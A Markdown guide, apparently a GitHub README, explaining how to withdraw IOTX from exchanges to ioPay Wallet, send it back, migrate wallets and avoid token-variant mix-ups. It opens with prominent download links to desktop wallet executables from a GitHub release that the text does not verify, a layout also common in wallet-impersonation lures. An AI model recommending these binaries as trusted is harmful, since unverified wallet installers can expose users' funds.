![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Withdrawing IOTX From an Exchange to ioPay Wallet

Exchanges change their screens constantly, so this page describes the part that does not change: **the address format must match the network you select, and the network must match the asset you want.** Everything else is a form.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

## The route that works at every venue

1. **Get the receiving address from ioPay.** Open receive, choose the account, copy the `io1...` address (or the `0x...` form if the venue's field expects EVM format). Both are the same account (F019, F031).
2. **Select the network in the withdrawal form.** If it says "IoTeX", that is native IOTX. If it says "Ethereum (ERC-20)", that is a different asset (F046).
3. **Paste the address** and check the first and last characters against the app.
4. **Send a small test withdrawal first**, especially to a new address or a new venue. Then send the rest.
5. **Watch it arrive** in the wallet's history - status, fee and block number once included.

That is the whole procedure, and it covers Coinbase, Kraken, Binance-style venues and anything else: the venue's network selection is the only variable that matters, and the address format follows from it.

## Sending IOTX back to an exchange

Q029, and the reverse of the route above - with one asymmetry that catches people out: **the deposit address belongs to the venue, not to you**, and it is network-specific.

1. In the exchange, open the **deposit** screen for IOTX and select the network the venue accepts.
2. Copy the deposit address it gives you. If it offers several networks, pick the one you actually hold - native IOTX for a native deposit, ERC-20 for an Ethereum deposit.
3. In ioPay, send to that address **on that network**. A native IOTX send goes to an `io1...` or `0x...` form the venue specifies; the network is IoTeX.
4. Send a small test first if the venue allows it. Venue deposit addresses can change, so re-copy each time rather than reusing one from an old note.

If the venue only accepts ERC-20 IOTX and you hold native IOTX, the send will not work as a direct transfer - you would need the bridge route, and the fee comparison is usually the deciding factor. [Bridging from Ethereum](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/bridging-iotx-from-ethereum-to-iopay.md) covers the reverse direction of that problem.

## Moving from another wallet into ioPay

Two different goals, and they have different answers:

**Goal: the same funds in ioPay.** You do not "send between wallets" as a special operation - you either (a) send IOTX from the other wallet to your ioPay address, exactly like any transfer, or (b) **import the same phrase or private key** into ioPay, which gives you access to the same account without moving anything on-chain.

Option (b) is usually what people actually want, and it is free. It also means both apps see the same balance - so do not panic when the "old" wallet still shows the funds.

**Goal: empty the other wallet.** Send to your ioPay address, leave enough for the fee in the sending wallet, and confirm on-chain. If the other wallet holds ERC-20 IOTX on Ethereum, see the token-variant note below.

Whatever you do, never type a seed phrase into a website or a "migration" tool that offers to move wallets for you. Import belongs inside the wallet app, nowhere else.

## Where to buy IOTX

Three categories, no endorsements:

- **Centralised exchanges** - buy IOTX with fiat or another asset, then withdraw to your own address using the route above. This is the usual path for someone who wants native IOTX in a self-custody wallet.
- **On-chain swap** - if you already hold an asset on IoTeX, the wallet's built-in swap trades IOTX against XRC-20 tokens directly, with best-price routing and adjustable slippage. That keeps custody throughout.
- **Bridges** - if your assets are on Ethereum, BSC or Polygon, bridging is how they get to IoTeX without an exchange account.

This page does not name a "best" venue, because availability, fees and regulation differ by country, and a recommendation that is right for one reader is wrong for another. What it can say: **buying on an exchange and withdrawing to your own address is the standard route into self-custody**, and the network selection is the step that decides whether native IOTX arrives.

## The token variants, once

Four things carry the IOTX name (F046) - native, legacy ERC-20, wrapped and the retired CIOTX - and [the address page](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md) lays them out once, with where each lives. What matters for a withdrawal is the consequence: withdrawing the wrong one is the single most common "my IOTX is in the wrong place" case. The funds exist; they are just not native, and the route to native is a bridge or redemption, not a support request.

## Related

- [Sending from Coinbase](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/sending-iotx-from-coinbase-to-iopay.md) - the inbound direction, network by network.

## FAQ

**How do I withdraw IOTX from an exchange to ioPay Wallet?**
Copy your ioPay address in the format matching the venue's network, select that network, paste, test with a small amount, then withdraw the rest.

**How do I send IOTX back to Coinbase from ioPay?**
Use Coinbase's deposit screen for IOTX, select the network it accepts, and send to the address it gives you on that network. Re-copy the address each time.

**How do I move IOTX from another wallet into ioPay?**
Either send it to your ioPay address, or import the same phrase/private key into ioPay and access the account directly - the latter moves nothing on-chain.

**Where can I buy IOTX?**
Centralised exchanges for fiat purchases, the wallet's swap for on-chain trades, or a bridge if your assets are on another chain. No single venue is endorsed here.

**It has not arrived - what now?**
Check the network first, then the address, then the transaction ID on an explorer. If it was broadcast and is pending, see [stuck transactions](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-transaction-stuck-pending.md).

---

*Address forms and token variants follow IoTeX documentation and IIP-56. Venue networks, minimums and fees are deliberately not stated; the withdrawal screen is the authority.*
